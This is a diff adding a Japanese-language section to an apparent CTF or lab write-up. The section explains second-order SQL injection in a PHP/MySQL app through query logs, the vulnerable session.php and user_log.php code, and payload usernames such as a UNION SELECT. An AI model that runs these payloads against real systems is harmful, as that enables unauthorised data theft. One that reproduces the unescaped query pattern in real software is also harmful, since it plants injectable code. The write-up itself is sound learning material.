@@ -93,4 +93,54 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 ```
 ![image](https://user-images.githubusercontent.com/56021519/112273908-39216a00-8cc1-11eb-9dd6-cb89f5f5c89e.png)  
 
+## SQL Injection
+ログを見ると、`BBB'`というユーザー名でRegisterした場合、以下のようにSQLInjectionできることがわかる！  
+insertとselectでは違う構文でInjectionする必要があるが、その都度別のユーザー名を作成すれば任意のデータを読みだせる！  
+```txt
+                    70 Query    INSERT INTO user_log(username, login_date) values ('BBB'', '03/24/2021 04:04:12 am')
+
+                    72 Query    SELECT * FROM user_log WHERE username = 'BBB''
+```
+`user_log.php`  
+`$login_session`に`'`とかがエスケープされてない場合はSQLInjection可能！  
+```php
+                  if(isset($login_session)) {
+               
+                       $sql = "SELECT * FROM user_log WHERE username = '$login_session'";   
+```
+`session.php`  
+`$login_session`には`BBB'`が入る！  
+登録する前にPHP上では`\'`としてエスケープしていてもDBに登録する際に`'`に戻るので、それを読みだして使うとヤバい。  
+```php
+<?php
+   include('config.php');
+   session_start();
+   
+   $user_check = $_SESSION['login_user'];
+   
+   $ses_sql = mysqli_query($db,"select username from users where username = '$user_check' ");
+   
+   $row = mysqli_fetch_array($ses_sql,MYSQLI_ASSOC);
+   
+   $login_session = $row['username'];
+
+    if(!isset($login_session)){
+        header("location: index.php");
+    }
+?>
+```
+以下のように二つのユーザー名で作成するとデータを読みだせる。  
+べつにinsertの方はやらなくてもよさそう。  
+```txt
+',version())#
+                    81 Query    INSERT INTO user_log(username, login_date) values ('',version())#', '03/24/2021 04:15:11 am')
+                    83 Query    SELECT * FROM user_log WHERE username = '',version())#'
+
+
+' union select 1,2,3#
+                    90 Query    INSERT INTO user_log(username, login_date) values ('' union select 1,2,3#', '03/24/2021 04:18:19 am')
+                    92 Query    SELECT * FROM user_log WHERE username = '' union select 1,2,3#'
+```
+![image](https://user-images.githubusercontent.com/56021519/112277693-58ba9180-8cc5-11eb-8050-3ecbb620046d.png)  
+
 
